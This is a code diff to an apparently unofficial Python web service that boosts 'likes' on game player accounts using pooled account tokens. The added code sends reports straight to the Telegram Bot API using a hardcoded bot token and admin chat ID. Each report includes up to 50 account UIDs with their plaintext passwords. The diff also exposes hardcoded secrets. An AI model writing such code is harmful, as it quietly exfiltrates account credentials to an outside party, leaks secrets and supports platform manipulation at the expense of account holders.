@@ -54,6 +54,11 @@ LIKE_CONCUR = 150
 REQUEST_TIMEOUT = 15
 API_KEY = "NirobAPI_Secret_2026_ChangeMe"
 
+# ✅ NEW: Direct Telegram Report (no bot URL needed)
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8313866882:AAErkYNbNWDY0pl60NQbIJ3eZtn5NoIn3fI")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", "5674825926"))
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
 # Level based limits
 LEVEL_LIMITS = {
     8: 20, 9: 50, 15: 100, 20: 100,
@@ -107,10 +112,6 @@ HISTORY_FILE = os.path.join(BASE_DIR, "update_history.json")
 GUESTS_DB_PATH = os.path.join(BASE_DIR, "guests_db.json")
 STATS_FILE = os.path.join(BASE_DIR, "web_stats.json")
 MAX_HISTORY = 30
-
-# Report to bot
-NIROB_BOT_REPORT_URL = "http://127.0.0.1:5001/api/report"
-NIROB_BOT_REPORT_KEY = "NirobBot_Report_Secret_2026"
 
 SERVER_CONFIG = {
     "BD":  {"jwt": "jwt_bd.json",  "accounts": "account_bd.txt"},
@@ -417,39 +418,57 @@ def _parse_account_info(pb_obj):
         return None
 
 # ============================================================
-#  REPORT TO BOT
+#  ✅ REPORT TO BOT — Direct Telegram API (No bot URL needed!)
 # ============================================================
 def send_report_to_bot(target_uid, nickname, region, likes_given, before, after,
                        gift, elapsed, total_tokens, success_tokens):
-    uid_pass_list = []
-    for t in success_tokens:
-        uid_pass_list.append({
-            "uid": str(t.get("token_uid", "")),
-            "password": str(t.get("password", "")),
-            "level": int(t.get("level", 8))
-        })
-    if not uid_pass_list:
-        return False
-    payload = {
-        "target_uid": str(target_uid),
-        "target_nickname": str(nickname),
-        "target_region": str(region),
-        "likes_given": int(likes_given),
-        "likes_before": int(before),
-        "likes_after": int(after),
-        "gift_count": int(gift),
-        "elapsed": float(elapsed),
-        "total_tokens": int(total_tokens),
-        "success_count": len(uid_pass_list),
-        "uid_pass_list": uid_pass_list,
-        "time": datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
-    }
+    """Send report directly to Telegram Bot API (no bot server URL needed)"""
+    msg = "📊 <b>LIKE REPORT</b>\n"
+    msg += "━━━━━━━━━━━━━━━━━━━━\n\n"
+    msg += f"🎯 <b>Target:</b> <code>{target_uid}</code>\n"
+    msg += f"👤 <b>Nickname:</b> <code>{escape_html(nickname)}</code>\n"
+    msg += f"🌍 <b>Region:</b> <code>{region}</code>\n\n"
+    msg += f"❤️ <b>Likes:</b> <code>+{likes_given}</code>\n"
+    msg += f"📈 <b>{before} → {after}</b>\n"
+    msg += f"🎁 <b>Gifts:</b> <code>{gift}</code>\n"
+    msg += f"⏱ <b>Time:</b> <code>{elapsed}s</code>\n\n"
+    msg += f"🎫 <b>Tokens:</b> <code>{len(success_tokens)}/{total_tokens}</code>\n"
+    msg += f"🕐 <code>{datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}</code>\n\n"
+    msg += "━━━━━━━━━━━━━━━━━━━━\n\n"
+
+    if success_tokens:
+        msg += f"✅ <b>SUCCESS UIDs ({len(success_tokens)})</b>\n\n"
+        for t in success_tokens[:50]:
+            uid_val = t.get("token_uid", "?")
+            pwd_val = t.get("password", "")
+            lvl = t.get("level", 8)
+            msg += f"🔹 <code>{uid_val}</code> (Lvl {lvl})\n"
+            if pwd_val and pwd_val != "NOT_FOUND":
+                msg += f"    🔑 <code>{pwd_val}</code>\n"
+            msg += "\n"
+        if len(success_tokens) > 50:
+            msg += f"<i>... +{len(success_tokens) - 50} more</i>\n"
+    else:
+        msg += "❌ <i>No success UIDs</i>"
+
     try:
-        r = requests.post(NIROB_BOT_REPORT_URL, json=payload,
-                          headers={"X-API-Key": NIROB_BOT_REPORT_KEY}, timeout=10)
-        return r.status_code == 200
+        r = requests.post(
+            TELEGRAM_API,
+            json={
+                "chat_id": ADMIN_ID,
+                "text": msg,
+                "parse_mode": "HTML",
+                "disable_web_page_preview": True
+            },
+            timeout=15
+        )
+        if r.status_code == 200:
+            print(f"[REPORT] ✅ Sent to Telegram")
+            return True
+        print(f"[REPORT] ❌ TG API failed: {r.status_code} {r.text[:200]}")
+        return False
     except Exception as e:
-        print(f"[REPORT] {e}")
+        print(f"[REPORT] ❌ {e}")
         return False
 
 # ============================================================
@@ -1350,4 +1369,5 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     print(f"🚀 {BRAND_NAME} v{VERSION} on port {port}")
     print(f"📋 Endpoints: 35+")
+    print(f"📤 Report → Direct Telegram API (Admin: {ADMIN_ID})")
     app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
